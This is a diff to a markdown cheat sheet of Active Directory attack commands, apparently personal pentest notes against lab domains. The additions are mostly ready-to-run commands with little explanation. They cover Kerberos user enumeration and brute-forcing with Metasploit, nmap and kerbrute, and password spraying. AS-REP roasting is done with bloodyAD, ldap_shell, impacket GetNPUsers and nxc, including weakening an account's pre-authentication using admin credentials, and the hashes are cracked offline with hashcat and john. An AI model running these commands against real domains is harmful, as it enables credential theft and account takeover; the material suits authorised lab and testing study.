@@ -8,6 +8,31 @@ kerbrute_linux_amd64 bruteuser -d lab.ropnop.com passwords.lst thoffman
 cat combos.lst | ./kerbrute -d lab.ropnop.com bruteforce -
 ```
 
+
+
+using metasploit:
+```bash
+use auxiliary/scanner/kerberos/kerberos_login
+set rhosts 192.168.1.48
+set domain ignite.local
+set user_file users.txt
+run
+
+use auxiliary/gather/kerberos_enumusers
+set rhosts 192.168.1.48
+set domain ignite.local
+set user_file users.txt
+run
+```
+
+
+using nmap:
+```bash
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='ignite.local',userdb=users.txt 192.168.1.48
+```
+
+
+
 Uses port 135 RPC:
 ```bash
 rpcclient -U "local Username" <domain ip>
@@ -24,7 +49,7 @@ Enumerate compromised user:
 impacket-lookupsid username:password@<DC IP>
 ```
 
-Enumerate kerberos:
+Enumerate kerberos (AS-REP roasting & Kerberosting):
 ```bash
 nmap -p 88 --script krb5-enum-users <target>
 
@@ -32,11 +57,50 @@ kerbrute userenum --dc <domain_controller> -d <domain.local> users.txt
 kerbrute passwordspray -d corp.local --dc 192.168.1.10 valid_users.txt 'Winter2025!'
 
 
-GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -outputfile asreproast_hashes.txt
-hashcat -m 18200 asreproast_hashes.txt rockyou.txt
-
 # AS-REP roasting
-GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -outputfile asreproast.txt
+#Attackers can exploit user accounts with Kerberos pre-authentication disabled by requesting encrypted credentials (AS-REP responses) and cracking them offline.
+
+#disable pre authentication mechanism we you have domain credentials to make it vulnerable. 
+
+bloodyAD --host 192.168.1.48 -d ignite.local -u administrator -p Ignite@987 add uac yashika -f DONT_REQ_PREAUTH
+
+ldap_shell ignite.local/administrator:Ignite@987 -dc-ip 192.168.1.48
+set_dontreqpreauth yashika true
+set_dontreqpreauth yashika false
+
+#in valid_user.txt
+jdoe
+asmith
+svc_backup
+admin@corp.local
+corp.local\svc_sql
+
+
+impacket-GetNPUsers ignite.local/yashika -dc-ip 192.168.1.48 -no-pass
+GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -outputfile asreproast_hashes.txt
+
+use auxiliary/gather/asrep
+set rhosts 192.168.1.48
+set domain ignite.local
+set user_file users.txt
+run
+
+use auxiliary/gather/asrep
+set domain ignite.local
+set rhosts 192.168.1.48
+set username yashika
+run
+
+
+nxc ldap 192.168.154.134 -u "/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt" -p '' -k
+nxc ldap 192.168.1.48 -u "users.txt" -p '' --asreproast output.txt
+
+
+
+hashcat -m 18200 asreproast_hashes.txt rockyou.txt
+john -w=/usr/share/wordlists/rockyou.txt hashes
+
+
 
 ```
 
